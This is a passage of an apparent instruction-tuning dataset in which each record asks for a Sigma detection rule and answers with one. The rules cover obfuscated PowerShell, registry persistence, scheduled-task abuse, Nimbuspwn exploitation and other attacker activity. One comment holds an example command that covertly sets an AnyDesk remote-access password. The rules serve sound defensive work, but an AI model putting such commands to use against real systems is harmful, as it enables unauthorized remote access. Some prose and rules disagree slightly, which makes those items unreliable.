    "instruction": "Build a Sigma rule with the goal of detecting executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe), you should: Monitor Windows process creation logs for instances where the process image name ends with 'ttdinject.exe' or where the original filename is 'TTDInject.EXE'. This activity could indicate a debugging attempt using this specific tool, and as such, should be closely scrutinized. Bear in mind that while monitoring for these criteria, you might encounter legitimate uses of TTDInject.exe, categorizing such events as potential false positives. The severity of this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)",
      "answer": "In order to detect the execution of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe), you should: Monitor Windows process creation logs for instances where the process image name ends with 'ttdinject.exe' or where the original filename is 'TTDInject.EXE'. This activity could indicate a debugging attempt using this specific tool, and as such, should be closely scrutinized. Bear in mind that while monitoring for these criteria, you might encounter legitimate uses of TTDInject.exe, categorizing such events as potential false positives. The severity of this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the Gpg4win to decrypt files located in suspicious locations from CLI.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the Gpg4win to decrypt files located in suspicious locations from CLI, you should: Focus on the creation of new processes on Windows operating systems, specifically keeping an eye out for any instances of the 'gpg2.exe' executable, which is a component of the GNU Privacy Guard (GnuPG), developed by g10 Code GmbH. It's critical to monitor any command line arguments that include '-passphrase', which indicates the input of a passphrase for decryption directly through the command line interface - a method that could suggest an automated or scripted decryption process, possibly indicating malicious behavior. \n\nAdditionally, pay close attention to the command line paths involving directory locations such as '\\AppData\\Roaming\\', 'C:\\Perflogs\\', 'C:\\Windows\\Temp\\', and 'C:\\temp'. Usage of these paths can be indicative of attempts to decrypt files stored in locations that are commonly used for temporary storage or hiding malicious data away from typical user directories. \n\nIt's important, however, to consider the context of these detections, as legitimate usage of Gpg4win for file encryption and decryption could also trigger these conditions. Thus, any alert based on these criteria should be investigated to discern between benign use and potential security threats. The detection sensitivity is set to a medium level to balance between the likelihood of detecting actual malicious activity and minimizing false positives originating from regular, non-malicious use of GnuPG for encryption and decryption tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\gpg2.exe'\n        - Product: 'GNU Privacy Guard (GnuPG)'\n        - Company: 'g10 Code GmbH'\n    selection_cli:\n        CommandLine|contains: '-passphrase'\n    selection_paths:\n        CommandLine|contains:\n            - '\\AppData\\Roaming\\'\n            - 'C:\\Perflogs\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\temp'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\gpg2.exe'\n        - Product: 'GNU Privacy Guard (GnuPG)'\n        - Company: 'g10 Code GmbH'\n    selection_cli:\n        CommandLine|contains: '-passphrase'\n    selection_paths:\n        CommandLine|contains:\n            - '\\AppData\\Roaming\\'\n            - 'C:\\Perflogs\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\temp'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "usage of the Gpg4win to decrypt files located in suspicious locations from CLI",
      "answer": "In order to detect usage of the Gpg4win to decrypt files located in suspicious locations from CLI, you should: Focus on the creation of new processes on Windows operating systems, specifically keeping an eye out for any instances of the 'gpg2.exe' executable, which is a component of the GNU Privacy Guard (GnuPG), developed by g10 Code GmbH. It's critical to monitor any command line arguments that include '-passphrase', which indicates the input of a passphrase for decryption directly through the command line interface - a method that could suggest an automated or scripted decryption process, possibly indicating malicious behavior. \n\nAdditionally, pay close attention to the command line paths involving directory locations such as '\\AppData\\Roaming\\', 'C:\\Perflogs\\', 'C:\\Windows\\Temp\\', and 'C:\\temp'. Usage of these paths can be indicative of attempts to decrypt files stored in locations that are commonly used for temporary storage or hiding malicious data away from typical user directories. \n\nIt's important, however, to consider the context of these detections, as legitimate usage of Gpg4win for file encryption and decryption could also trigger these conditions. Thus, any alert based on these criteria should be investigated to discern between benign use and potential security threats. The detection sensitivity is set to a medium level to balance between the likelihood of detecting actual malicious activity and minimizing false positives originating from regular, non-malicious use of GnuPG for encryption and decryption tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via COMPRESS OBFUSCATION.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated Powershell via COMPRESS OBFUSCATION, you should: monitor PowerShell script activity on Windows systems by focusing on script block logs. This detection method requires that Script Block Logging is enabled to effectively capture the necessary data. Look for scripts that use the \"new-object\" command in combination with ASCII text encoding through \"text.encoding]::ascii\". Moreover, any scripts employing both \"system.io.compression.deflatestream\" and \"system.io.streamreader\" should attract attention. Additionally, scripts that end with the \"readtoend\" method are particularly suspect. These characteristics are indicative of attempts to use compressed obfuscation techniques within PowerShell, a method attackers leverage to hide malicious code within scripts. It's essential to note that while this detection strategy is robust, it may produce unknown false positives. The alert level for this detection is set to medium, suggesting a balanced approach to the responsiveness required upon detection. This monitoring strategy is relevant to identifying tactics and techniques such as Execution, Defense Evasion, and Command and Control within the context of cyber threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|contains|all:\n            - 'new-object'\n            - 'text.encoding]::ascii'\n        ScriptBlockText|contains:\n            - 'system.io.compression.deflatestream'\n            - 'system.io.streamreader'\n        ScriptBlockText|endswith: 'readtoend'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|contains|all:\n            - 'new-object'\n            - 'text.encoding]::ascii'\n        ScriptBlockText|contains:\n            - 'system.io.compression.deflatestream'\n            - 'system.io.streamreader'\n        ScriptBlockText|endswith: 'readtoend'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Obfuscated Powershell via COMPRESS OBFUSCATION",
      "answer": "In order to detect obfuscated Powershell via COMPRESS OBFUSCATION, you should: monitor PowerShell script activity on Windows systems by focusing on script block logs. This detection method requires that Script Block Logging is enabled to effectively capture the necessary data. Look for scripts that use the \"new-object\" command in combination with ASCII text encoding through \"text.encoding]::ascii\". Moreover, any scripts employing both \"system.io.compression.deflatestream\" and \"system.io.streamreader\" should attract attention. Additionally, scripts that end with the \"readtoend\" method are particularly suspect. These characteristics are indicative of attempts to use compressed obfuscation techniques within PowerShell, a method attackers leverage to hide malicious code within scripts. It's essential to note that while this detection strategy is robust, it may produce unknown false positives. The alert level for this detection is set to medium, suggesting a balanced approach to the responsiveness required upon detection. This monitoring strategy is relevant to identifying tactics and techniques such as Execution, Defense Evasion, and Command and Control within the context of cyber threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of autostart extensibility point (ASEP) in registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of autostart extensibility point (ASEP) in registry, you should: Monitor Windows registry for set value operations specifically within `\\Software\\Classes`, which is a common area for applications to add extensions or modifications that could affect the way files, folders, and actions are handled. Look for modifications in specific registry paths such as `\\Folder\\ShellEx\\ExtShellFolderViews`, `\\Folder\\ShellEx\\DragDropHandlers`, and similar paths that might be targeted by adversaries to establish persistence or modify the system's behavior for malicious purposes. These paths include areas related to file execution commands, context menu handlers, and drag and drop handlers among others. It is also important to filter out and ignore activities generated by known legitimate sources, such as Microsoft Office installations or certain system processes like 'drvinst.exe' and 'svchost.exe', which may legitimately interact with these registry areas for non-malicious reasons. Pay attention to the security identifiers, object names, and before and after values of the registry keys to understand the context of the changes. However, remain aware that legitimate software and administrative actions often modify these settings for non-malicious reasons, which could lead to false positives. The assessment should be of medium level, with proactive monitoring for the specific registry modifications, excluding the defined benign sources to pinpoint suspicious activity effectively. This approach aims at identifying tactics and techniques employed by adversaries to gain persistence and interfere with system or file behaviors maliciously.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_classes_base:\n        EventType: SetValue\n        TargetObject|contains: '\\Software\\Classes'\n    selection_classes_target:\n        TargetObject|contains:\n            - '\\Folder\\ShellEx\\ExtShellFolderViews'\n            - '\\Folder\\ShellEx\\DragDropHandlers'\n            - '\\Folder\\Shellex\\ColumnHandlers'\n            - '\\Filter'\n            - '\\Exefile\\Shell\\Open\\Command\\(Default)'\n            - '\\Directory\\Shellex\\DragDropHandlers'\n            - '\\Directory\\Shellex\\CopyHookHandlers'\n            - '\\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance'\n            - '\\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance'\n            - '\\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance'\n            - '\\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance'\n            - '\\Classes\\AllFileSystemObjects\\ShellEx\\DragDropHandlers'\n            - '\\.exe'\n            - '\\.cmd'\n            - '\\ShellEx\\PropertySheetHandlers'\n            - '\\ShellEx\\ContextMenuHandlers'\n    filter_empty:\n        Details: '(Empty)'\n    filter_msoffice:\n        Details: '{807583E5-5146-11D5-A672-00B0D022E945}'\n    filter_drivers:\n        Image: 'C:\\Windows\\System32\\drvinst.exe'\n    filter_svchost:\n        Image: 'C:\\Windows\\System32\\svchost.exe'\n        # If more targets are found from \"svchost\". Please exclude the whole image\n        TargetObject|contains: '\\lnkfile\\shellex\\ContextMenuHandlers\\'\n    condition: all of selection_* and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_classes_base:\n        EventType: SetValue\n        TargetObject|contains: '\\Software\\Classes'\n    selection_classes_target:\n        TargetObject|contains:\n            - '\\Folder\\ShellEx\\ExtShellFolderViews'\n            - '\\Folder\\ShellEx\\DragDropHandlers'\n            - '\\Folder\\Shellex\\ColumnHandlers'\n            - '\\Filter'\n            - '\\Exefile\\Shell\\Open\\Command\\(Default)'\n            - '\\Directory\\Shellex\\DragDropHandlers'\n            - '\\Directory\\Shellex\\CopyHookHandlers'\n            - '\\CLSID\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\Instance'\n            - '\\CLSID\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\Instance'\n            - '\\CLSID\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\Instance'\n            - '\\CLSID\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\Instance'\n            - '\\Classes\\AllFileSystemObjects\\ShellEx\\DragDropHandlers'\n            - '\\.exe'\n            - '\\.cmd'\n            - '\\ShellEx\\PropertySheetHandlers'\n            - '\\ShellEx\\ContextMenuHandlers'\n    filter_empty:\n        Details: '(Empty)'\n    filter_msoffice:\n        Details: '{807583E5-5146-11D5-A672-00B0D022E945}'\n    filter_drivers:\n        Image: 'C:\\Windows\\System32\\drvinst.exe'\n    filter_svchost:\n        Image: 'C:\\Windows\\System32\\svchost.exe'\n        # If more targets are found from \"svchost\". Please exclude the whole image\n        TargetObject|contains: '\\lnkfile\\shellex\\ContextMenuHandlers\\'\n    condition: all of selection_* and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in registry, you should: Monitor Windows registry for set value operations specifically within `\\Software\\Classes`, which is a common area for applications to add extensions or modifications that could affect the way files, folders, and actions are handled. Look for modifications in specific registry paths such as `\\Folder\\ShellEx\\ExtShellFolderViews`, `\\Folder\\ShellEx\\DragDropHandlers`, and similar paths that might be targeted by adversaries to establish persistence or modify the system's behavior for malicious purposes. These paths include areas related to file execution commands, context menu handlers, and drag and drop handlers among others. It is also important to filter out and ignore activities generated by known legitimate sources, such as Microsoft Office installations or certain system processes like 'drvinst.exe' and 'svchost.exe', which may legitimately interact with these registry areas for non-malicious reasons. Pay attention to the security identifiers, object names, and before and after values of the registry keys to understand the context of the changes. However, remain aware that legitimate software and administrative actions often modify these settings for non-malicious reasons, which could lead to false positives. The assessment should be of medium level, with proactive monitoring for the specific registry modifications, excluding the defined benign sources to pinpoint suspicious activity effectively. This approach aims at identifying tactics and techniques employed by adversaries to gain persistence and interfere with system or file behaviors maliciously."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies when an ElastiCache security group has been modified or deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName:\n            - 'DeleteCacheSecurityGroup'\n            - 'AuthorizeCacheSecurityGroupIngress'\n            - 'RevokeCacheSecurityGroupIngress'\n            - 'AuthorizeCacheSecurityGroupEgress'\n            - 'RevokeCacheSecurityGroupEgress'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName:\n            - 'DeleteCacheSecurityGroup'\n            - 'AuthorizeCacheSecurityGroupIngress'\n            - 'RevokeCacheSecurityGroupIngress'\n            - 'AuthorizeCacheSecurityGroupEgress'\n            - 'RevokeCacheSecurityGroupEgress'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
      "question": "Identifies when an ElastiCache security group has been modified or deleted.",
      "answer": "In order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting piping the password to an anydesk instance via CMD and the '--set-password' flag..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect piping the password to an anydesk instance via CMD and the '--set-password' flag, you should: Monitor Windows process creation logs for command lines that contain a sequence including '/c ', 'echo ', and '.exe --set-password'. This pattern suggests an attempt to programmatically set a password for an application, specifically AnyDesk in this scenario, using Windows command prompt (cmd.exe). This could indicate a malicious attempt to configure or modify the remote access software's settings without user consent or knowledge. Be aware, however, that there might be false positives such as legitimate uses of command-line operations for setting passwords in AnyDesk or similar tools that utilize the '--set-password' command. The severity of this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            # Example: C:\\WINDOWS\\system32\\cmd.exe /C cmd.exe /c echo J9kzQ2Y0qO |C:\\ProgramData\\anydesk.exe --set-password\n            - '/c '\n            - 'echo '\n            - '.exe --set-password'\n    condition: selection\nfalsepositives:\n    - Legitimate piping of the password to anydesk\n    - Some FP could occur with similar tools that uses the same command line '--set-password'\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            # Example: C:\\WINDOWS\\system32\\cmd.exe /C cmd.exe /c echo J9kzQ2Y0qO |C:\\ProgramData\\anydesk.exe --set-password\n            - '/c '\n            - 'echo '\n            - '.exe --set-password'\n    condition: selection\nfalsepositives:\n    - Legitimate piping of the password to anydesk\n    - Some FP could occur with similar tools that uses the same command line '--set-password'\nlevel: medium\n",
      "question": "piping the password to an anydesk instance via CMD and the '--set-password' flag.",
      "answer": "In order to detect piping the password to an anydesk instance via CMD and the '--set-password' flag, you should: Monitor Windows process creation logs for command lines that contain a sequence including '/c ', 'echo ', and '.exe --set-password'. This pattern suggests an attempt to programmatically set a password for an application, specifically AnyDesk in this scenario, using Windows command prompt (cmd.exe). This could indicate a malicious attempt to configure or modify the remote access software's settings without user consent or knowledge. Be aware, however, that there might be false positives such as legitimate uses of command-line operations for setting passwords in AnyDesk or similar tools that utilize the '--set-password' command. The severity of this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: taskscheduler\n    definition: 'Requirements: The \"Microsoft-Windows-TaskScheduler/Operational\" is disabled by default and needs to be enabled in order for this detection to trigger'\ndetection:\n    selection:\n        EventID: 129 # Created Task Process\n        Path|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\mspaint.exe'\n            - '\\notepad.exe'\n            - '\\regsvr32.exe'\n            #- '\\rundll32.exe'\n            - '\\wscript.exe'\n    #filter_system:\n    #    Path|endswith: '\\rundll32.exe'\n    #    TaskName|startswith: '\\Microsoft\\Windows\\'\n    #condition: selection and not 1 of filter_*\n    condition: selection\nfalsepositives:\n    - False positives may occur with some of the selected binaries if you have tasks using them (which could be very common in your environment). Exclude all the specific trusted tasks before using this rule\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: taskscheduler\n    definition: 'Requirements: The \"Microsoft-Windows-TaskScheduler/Operational\" is disabled by default and needs to be enabled in order for this detection to trigger'\ndetection:\n    selection:\n        EventID: 129 # Created Task Process\n        Path|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\mspaint.exe'\n            - '\\notepad.exe'\n            - '\\regsvr32.exe'\n            #- '\\rundll32.exe'\n            - '\\wscript.exe'\n    #filter_system:\n    #    Path|endswith: '\\rundll32.exe'\n    #    TaskName|startswith: '\\Microsoft\\Windows\\'\n    #condition: selection and not 1 of filter_*\n    condition: selection\nfalsepositives:\n    - False positives may occur with some of the selected binaries if you have tasks using them (which could be very common in your environment). Exclude all the specific trusted tasks before using this rule\nlevel: medium\n",
      "question": "execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task",
      "answer": "In order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell, you should focus on monitoring the process creation logs on Linux systems. Specifically, look for processes created by the root user (User: root) with a LogonId of 0, indicating a high level of privilege. Importantly, check whether the CurrentDirectory at the time of process initiation is '/var/opt/microsoft/scx/tmp', as this is a critical indicator of the SCX RunAsProvider's activity.\n\nPay close attention to the CommandLine field for any instances containing '/etc/opt/microsoft/scx/conf/tmpdir/scx', which suggests that a script with the 'scx*' prefix, created in the /tmp folder, is being executed. This action is a key behavior of the SCX RunAsProvider ExecuteScript function, utilized in various Microsoft products for UNIX/Linux scripting operations.\n\nBe aware that there could be legitimate uses of the SCX RunAsProvider ExecuteScript, so it's essential to discern between normal administrative actions and potential malicious activities. Such determinations should be made cautiously to avoid false alarms.\n\nThe detection of these activities is critical, given the high level of access and the potential for misusing the SCXcore component within Microsoft's operational management tools. Monitoring for these specific conditions will help identify unauthorized script executions, which could lead to higher privileges being exploited or malicious scripts impacting the UNIX/Linux systems managed through SCXcore.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        User: root\n        LogonId: 0\n        CurrentDirectory: '/var/opt/microsoft/scx/tmp'\n        CommandLine|contains: '/etc/opt/microsoft/scx/conf/tmpdir/scx'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SCX RunAsProvider ExecuteScript.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        User: root\n        LogonId: 0\n        CurrentDirectory: '/var/opt/microsoft/scx/tmp'\n        CommandLine|contains: '/etc/opt/microsoft/scx/conf/tmpdir/scx'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SCX RunAsProvider ExecuteScript.\nlevel: high\n",
      "question": "Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
      "answer": "In order to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell, you should focus on monitoring the process creation logs on Linux systems. Specifically, look for processes created by the root user (User: root) with a LogonId of 0, indicating a high level of privilege. Importantly, check whether the CurrentDirectory at the time of process initiation is '/var/opt/microsoft/scx/tmp', as this is a critical indicator of the SCX RunAsProvider's activity.\n\nPay close attention to the CommandLine field for any instances containing '/etc/opt/microsoft/scx/conf/tmpdir/scx', which suggests that a script with the 'scx*' prefix, created in the /tmp folder, is being executed. This action is a key behavior of the SCX RunAsProvider ExecuteScript function, utilized in various Microsoft products for UNIX/Linux scripting operations.\n\nBe aware that there could be legitimate uses of the SCX RunAsProvider ExecuteScript, so it's essential to discern between normal administrative actions and potential malicious activities. Such determinations should be made cautiously to avoid false alarms.\n\nThe detection of these activities is critical, given the high level of access and the potential for misusing the SCXcore component within Microsoft's operational management tools. Monitoring for these specific conditions will help identify unauthorized script executions, which could lead to higher privileges being exploited or malicious scripts impacting the UNIX/Linux systems managed through SCXcore."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800), you should: Monitor Linux system logs for specific indicators that signal an attack attempt related to these vulnerabilities. Look for log entries that contain any of the following keywords: 'networkd-dispatcher', 'Error handling notification for interface', or '../../'. These keywords suggest exploitation attempts that take advantage of the Nimbuspwn vulnerability, such as abnormal error handling notifications or the use of directory traversal patterns. It's important to treat any log entries matching these patterns with a high level of suspicion, as there are not known false positives that are common with these indicators in the context of a Linux environment. This detection focuses on key activities associated with privilege escalation attempts, leveraging the vulnerabilities in question.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        '|all':\n            - 'networkd-dispatcher'\n            - 'Error handling notification for interface'\n            - '../../'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        '|all':\n            - 'networkd-dispatcher'\n            - 'Error handling notification for interface'\n            - '../../'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)",
